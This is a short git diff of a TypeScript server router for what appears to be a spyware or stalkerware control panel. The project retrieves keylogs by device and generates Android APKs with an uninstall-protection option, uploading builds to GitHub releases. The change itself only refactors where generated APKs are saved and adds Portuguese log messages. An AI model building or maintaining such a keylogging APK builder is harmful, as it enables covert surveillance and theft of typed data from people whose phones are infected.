@@ -12,6 +12,7 @@ import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, 
 import { sdk } from "./_core/sdk";
 import { generateRealAPK } from "./apk-generator-real";
 import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
+import { getApksDir, getApkFilePath, logApkDirInfo } from "./apk-paths";
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
@@ -317,12 +318,13 @@ export const appRouter = router({
                 protectFromUninstall: input.protectFromUninstall,
               });
 
-              const apksDir = path.join(process.cwd(), 'public', 'apks');
-              if (!fs.existsSync(apksDir)) {
-                fs.mkdirSync(apksDir, { recursive: true });
-              }
-              const apkPath = path.join(apksDir, filename);
+              // Use unified APK directory helper
+              const apksDir = getApksDir();
+              const apkPath = getApkFilePath(filename);
+              console.log('[APK] Salvando APK em:', apkPath);
               fs.writeFileSync(apkPath, apkBuffer);
+              console.log('[APK] APK salvo com sucesso!');
+              logApkDirInfo();
               
               // APK já é assinado pelo gerador
               
